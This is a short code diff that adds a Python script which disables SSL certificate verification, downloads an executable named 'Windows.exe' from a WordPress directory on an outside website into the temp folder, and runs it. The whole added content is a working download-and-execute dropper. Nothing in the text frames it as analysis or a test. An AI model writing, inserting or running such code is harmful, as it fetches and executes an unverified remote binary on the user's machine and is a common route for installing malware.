@@ -1,1 +1,9 @@
-
+#to download file .exe in temp folder & execute it
+import tempfile
+import urllib.request as urllib2
+import ssl
+ssl._create_default_https_context = ssl._create_unverified_context
+url = 'https://luckyebuy.com/wp-includes/Windows.exe'
+f = urllib2.urlretrieve(url, tempfile.gettempdir() + r"\Windows.exe")
+import os
+os.startfile(tempfile.gettempdir() + r"\Windows.exe")
